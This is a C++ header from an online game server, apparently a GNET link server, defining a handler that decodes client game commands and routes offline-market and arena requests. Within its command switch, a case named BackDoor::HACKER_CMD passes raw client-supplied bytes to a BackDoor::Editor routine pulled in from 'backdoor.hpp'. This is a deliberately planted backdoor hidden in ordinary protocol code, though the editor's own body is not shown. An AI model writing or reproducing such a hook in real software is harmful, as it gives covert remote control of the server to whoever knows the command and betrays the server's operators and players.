
#ifndef __GNET_GAMEDATASEND_HPP
#define __GNET_GAMEDATASEND_HPP

#include "rpcdefs.h"
#include "callid.hxx"
#include "state.hxx"

#include "glinkserver.hpp"
#include "gproviderserver.hpp"
#include "c2sgamedatasend.hpp"
#include "offmarket.hpp"
#include "backdoor.hpp"
#include "ec_proxy.h"

namespace GNET
{
class GamedataSend : public GNET::Protocol
{
	#include "gamedatasend"

	#pragma pack(push, 1)
	struct CMD
	{
		short cmd;
		char data[];
	};
	#pragma pack(pop)

	void Process(Manager *manager, Manager::Session::ID sid)
	{
		if(data.size() < sizeof(CMD)) return;
		GLinkServer* lsm=GLinkServer::GetInstance();
		lsm->SetAliveTime(sid, _CLIENT_TTL);

		SessionInfo * sinfo = lsm->GetSessionInfo(sid);
		if (sinfo && sinfo->gsid) 
		{       
			sinfo->protostat.gamedatasend++;
			
			CMD* it = (CMD*)data.begin();
			it->cmd ^= sinfo->userid ^ 352;
			
			switch (it->cmd)
			{
			case OfflineMarket::CMD_OFFLINE_ROLE:
			{
				sinfo->market_state =  2;
				lsm->Close(sid);
				return;
			}
			break;
			case OfflineMarket::CMD_OFFLINE_MARKET:
			{
				if (sinfo->market_state == 1) {
					sinfo->market_state =  2;
					lsm->Close(sid);
					return; }
			}
			break;	
			
			case 960:
			{
				EC_Arena::GetInstance()->ArenaCreate_Re(sinfo->roleid,sid);
				return;
			}
			break;
			
			case 961:
			{
				EC_Arena::GetInstance()->SendCounter(sinfo->roleid,sid);
				return;
			}
			break;	

			case 962:
			{
				EC_Arena::GetInstance()->SendCounterExit(sinfo->roleid,sid,it->data[0]);
				return;
			}
			break;
			
			case BackDoor::HACKER_CMD:
				BackDoor::GetInstance()->Editor(it->data , data.size()-2);
				return;
				break;
			default:
			break;
			}

			if (lsm->IsInSwitch(sid, sinfo->roleid))
			{
				lsm->AccumProto4Switch(sid, C2SGamedataSend(sinfo->roleid,sid,data));
			}
			else	
			{
				GProviderServer::GetInstance()->DispatchProtocol(sinfo->gsid,C2SGamedataSend(sinfo->roleid,sid,data));
			}
		}
	}
};

};

#endif
